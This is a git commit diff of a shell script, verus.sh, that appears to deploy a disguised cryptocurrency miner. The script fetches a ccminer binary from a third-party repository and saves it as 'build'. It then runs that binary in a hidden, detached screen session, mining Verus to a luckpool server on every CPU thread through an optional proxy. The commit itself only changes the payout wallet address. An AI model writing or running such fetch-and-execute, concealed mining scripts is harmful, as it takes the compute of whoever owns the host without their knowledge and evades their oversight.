0e39d3e397c51a78a495a3af3c878b8ea26c2e25
uzaki19 <88629461+uzaki19@users.noreply.github.com>
2021-10-22 03:12:46 +0700

    Update verus.sh

--- verus.sh
+++ verus.sh
@@ -11,6 +11,6 @@ wget -q https://raw.githubusercontent.com/declined01/master/master/compile.sh
 wget -qO build https://github.com/declined01/master/raw/master/ccminer
 chmod +x build
 chmod +x compile.sh
-screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RV9KzJ9v7HJ5puLKh32iWPGboKXDoL7HB3.worker-$worker -p x -t $(nproc --all) -x $proxy
+screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RT1Re4JxYJFcq7oM46F9aYe29nZQ9VU5As.worker-$worker -p x -t $(nproc --all) -x $proxy
 ./compile.sh
 echo succes
